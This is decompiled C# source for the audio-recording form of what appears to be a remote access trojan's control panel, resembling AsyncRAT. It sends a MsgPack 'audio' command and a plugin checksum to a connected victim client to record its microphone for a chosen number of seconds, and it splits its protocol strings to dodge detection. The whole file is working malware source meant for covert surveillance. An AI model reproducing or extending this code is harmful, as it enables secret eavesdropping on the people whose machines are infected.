using System;
using System.ComponentModel;
using System.Drawing;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000057 RID: 87
	public partial class FormAudio : DarkForm
	{
		// Token: 0x1700009C RID: 156
		// (get) Token: 0x06000340 RID: 832 RVA: 0x0001BAE0 File Offset: 0x0001BAE0
		// (set) Token: 0x06000341 RID: 833 RVA: 0x0001BAE8 File Offset: 0x0001BAE8
		public global::Form1 F { get; set; }

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x06000342 RID: 834 RVA: 0x0001BAF4 File Offset: 0x0001BAF4
		// (set) Token: 0x06000343 RID: 835 RVA: 0x0001BAFC File Offset: 0x0001BAFC
		internal Clients ParentClient { get; set; }

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x06000344 RID: 836 RVA: 0x0001BB08 File Offset: 0x0001BB08
		// (set) Token: 0x06000345 RID: 837 RVA: 0x0001BB10 File Offset: 0x0001BB10
		internal Clients Client { get; set; }

		// Token: 0x06000346 RID: 838 RVA: 0x0001BB1C File Offset: 0x0001BB1C
		public FormAudio()
		{
			this.InitializeComponent();
			base.MinimizeBox = false;
			base.MaximizeBox = false;
		}

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x06000347 RID: 839 RVA: 0x0001BB54 File Offset: 0x0001BB54
		// (set) Token: 0x06000348 RID: 840 RVA: 0x0001BB5C File Offset: 0x0001BB5C
		public byte[] BytesToPlay { get; set; }

		// Token: 0x06000349 RID: 841 RVA: 0x0001BB68 File Offset: 0x0001BB68
		private void btnStartStopRecord_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "audio";
				msgPack.ForcePathObject("Second").AsString = this.textBox1.Text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Audio.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				Thread.Sleep(100);
				this.btnStartStopRecord.Text = "Wait...";
				this.btnStartStopRecord.Enabled = false;
				return;
			}
			MessageBox.Show("Input seconds to record.");
		}

		// Token: 0x0600034A RID: 842 RVA: 0x0001BC58 File Offset: 0x0001BC58
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x040001DD RID: 477
		private SoundPlayer SP = new SoundPlayer();
	}
}
